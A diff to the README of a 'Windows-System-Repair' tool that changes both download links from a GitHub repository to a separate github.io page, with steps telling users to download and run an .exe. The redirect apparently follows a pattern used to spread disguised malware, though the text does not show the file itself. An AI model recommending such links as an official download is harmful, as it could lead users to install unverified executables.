@@ -1,6 +1,6 @@
 # 🛠 Windows-System-Repair - Fix broken system files with ease
 
-[![Download Windows-System-Repair](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Sdmmin7553/Windows-System-Repair)
+[![Download Windows-System-Repair](https://img.shields.io/badge/Download-Application-blue.svg)](https://sdmmin7553.github.io)
 
 ## 📋 About the software
 
@@ -29,7 +29,7 @@ This tool works on most modern computer setups. To use it, your machine must mee
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit [the official download page](https://github.com/Sdmmin7553/Windows-System-Repair).
+1. Visit [the official download page](https://sdmmin7553.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
